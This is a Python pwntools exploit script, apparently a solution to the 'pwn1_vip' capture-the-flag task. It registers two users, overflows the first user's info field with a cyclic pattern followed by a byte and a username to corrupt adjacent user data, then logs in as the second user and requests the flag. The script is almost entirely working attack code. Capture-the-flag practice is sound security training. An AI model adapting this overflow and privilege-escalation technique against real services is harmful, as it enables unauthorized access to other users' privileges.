#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit for this task:
# https://pwn.spbctf.ru/tasks/pwn1_vip

# Template was generated via:
# $ pwn template --host 127.0.0.1 --port 1337

from pwn import *
import os

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './pwn1_vip'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


io = start()
io.recvuntil(b'> ')

# Register two Users

def register(name, password, info):
    io.sendline(b'2')
    io.recvuntil(b'Enter username: ')
    io.sendline(name)
    io.recvuntil(b'Enter password: ')
    io.sendline(password)
    io.recvuntil(b'Enter information about youself: ')
    io.sendline(info)
    io.recvuntil(b'> ')
		
register(b'one', b'one', b'one') 
print ("[+] User one is registered")
register(b'two', b'two', b'two') 
print ("[+] User two is registered")

# Login as new user one

def login(name, password):
    io.sendline(b'1')
    io.recvuntil(b'Enter username: ')
    io.sendline(name)
    io.recvuntil(b'Enter password: ')
    io.sendline(password)
    io.recvuntil(b'> ')

login(b'one', b'one')
print ("[+] Logged in as user one")	

# Change info

def change_info(info):
#   already login(b'one', b'one')
    io.sendline(b'2')
    io.recvuntil(b'Enter new info about yourself: ')
    io.sendline(info)
    io.recvuntil(b'> ')

print("[*] Info to send: ")
print(cyclic(50)+b'\x01'+b'two')	

change_info(cyclic(50)+b'\x01'+b'two')
print ("[+] Info is changed")

# Exit to main menu
io.sendline(b'4')
io.recvuntil(b'> ')
	
# Login as user two
login(b'two', b'two')
print ("[+] Logged in as user two")	

# Get flag
io.sendline(b'3')
print ("[+] Sent 3 to get the flag")	

io.interactive()
io.close()